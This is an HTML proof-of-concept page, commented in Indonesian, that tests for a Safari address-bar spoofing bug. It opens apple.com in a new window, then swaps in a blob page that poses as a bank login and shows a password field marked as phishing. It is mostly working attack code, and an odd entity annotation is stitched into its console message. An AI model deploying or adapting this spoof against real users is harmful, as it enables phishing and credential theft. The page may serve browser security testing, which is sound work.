<!DOCTYPE html>
<html>
<body>
<h2>URL Spoof Test - Safari</h2>
<button onclick="spoof()">TEST SPOOF - TAP</button>
<script>
function spoof(){
  let html = `<h1>Bank.com - Secure Login</h1><p>URL bar masih bank.com tapi content dari attacker</p><script>setTimeout(()=>{document.body.innerHTML='<h1>FAKE LOGIN - PHISHING</h1><input placeholder=password>'},2000)<\/script>`;
  let blob = new Blob([html], {type:'text/html'});
  let url = URL.createObjectURL(blob);
  
  // Buka bank.com dulu
  let w = window.open("https://www.apple.com", "_blank");
  setTimeout(()=>{
    // Timpa dengan blob setelah 1 detik
    w.location = url;
    console.log("Kalau URL bar masih 【entity-apple¦canonical_name=Apple】.com tapi isi blob = SPOOF BUG");
  },1000);
}
</script>
</body>
</html>
